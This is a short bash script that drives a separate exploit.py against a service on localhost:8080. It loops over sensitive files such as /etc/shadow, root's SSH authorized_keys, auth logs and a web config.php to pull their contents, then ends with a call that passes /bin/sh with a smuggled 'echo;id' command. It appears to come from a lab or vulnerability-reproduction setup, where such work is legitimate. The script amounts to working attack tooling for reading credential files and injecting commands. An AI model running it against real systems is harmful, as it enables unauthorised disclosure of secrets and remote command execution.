#!/bin/bash

SCRIPT_DIR=$(dirname "$(realpath "$0")")

host=localhost
port=8080

# List of sensitive file paths to attempt to access
sensitive_paths=(
    "/etc/passwd"
    "/etc/shadow"
    "/etc/hosts"
    "/etc/hostname"
    "/etc/group"
    "/root/.bash_history"
    "/root/.ssh/authorized_keys"
    "/var/log/syslog"
    "/var/log/auth.log"
    "/var/www/html/config.php"
)

# Attempt to access each sensitive file
for file_path in "${sensitive_paths[@]}"; do
    echo "Running exploit to retrieve $file_path..."
    python3 $SCRIPT_DIR/exploit.py $host:$port "$file_path"
done

python3 $SCRIPT_DIR/exploit.py $host:$port /bin/sh echo;id